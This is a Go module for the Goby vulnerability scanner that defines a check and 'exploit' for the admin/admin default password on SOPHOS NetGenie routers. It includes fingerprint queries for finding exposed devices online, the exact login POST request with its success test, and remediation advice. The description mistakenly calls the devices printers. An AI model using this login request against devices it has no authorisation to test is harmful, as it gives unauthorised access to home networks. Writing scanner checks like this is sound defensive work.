package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SOPHOS-Netgenie  Default Password",
    "Description": "<p>With NetGenie, get support for all types of Internet connectivity, viz. VDSL2, ADSL2+, Cable Internet and 3G connection, along with excellent wireless range, high performance, Gigabit port and threat-free Wi-Fi over multiple devices. Get Internet activity reports of children at home along with security reports of your home network.The command center of this series of printers has admin/admin default password.</p>",
    "Product": "SOPHOS-Netgenie",
    "Homepage": "https://netgeniee.com/",
    "DisclosureDate": "2022-12-20",
    "Author": "wmqfree@163.com",
    "FofaQuery": "header=\"Server: Netgenie\" || banner=\"Server: Netgenie\"",
    "GobyQuery": "header=\"Server: Netgenie\" || banner=\"Server: Netgenie\"",
    "Level": "1",
    "Impact": "<p>SOPHOS-Netgenie  have default passwords. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tweb/index.php?op=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /tweb/menu.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/tweb/index.php?op=login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /tweb/menu.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin/admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "SOPHOS-Netgenie 默认口令",
            "Product": "SOPHOS-Netgenie",
            "Description": "<p>使用 NetGenie，获得对所有类型的 Internet 连接的支持，即。VDSL2、ADSL2+、有线互联网和 3G 连接，以及出色的无线范围、高性能、千兆端口和跨多个设备的无威胁 Wi-Fi。获取家中儿童的互联网活动报告以及家庭网络的安全报告。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。<br></p><p>2、如非必要，禁止公网访问该管理系统。<br></p>",
            "Impact": "<p>SOPHOS-Netgenie存在默认口令，攻击者可未授权使用默认口令admin/admin登录系统后台，执行其他敏感操作，获取更多敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "SOPHOS-Netgenie  Default Password",
            "Product": "SOPHOS-Netgenie",
            "Description": "<p>With NetGenie, get support for all types of Internet connectivity, viz. VDSL2, ADSL2+, Cable Internet and 3G connection, along with excellent wireless range, high performance, Gigabit port and threat-free Wi-Fi over multiple devices. Get Internet activity reports of children at home along with security reports of your home network.The command center of this series of printers has admin/admin default password.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
            "Impact": "<p>SOPHOS-Netgenie&nbsp; have default passwords. Attackers can use the default password admin/admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
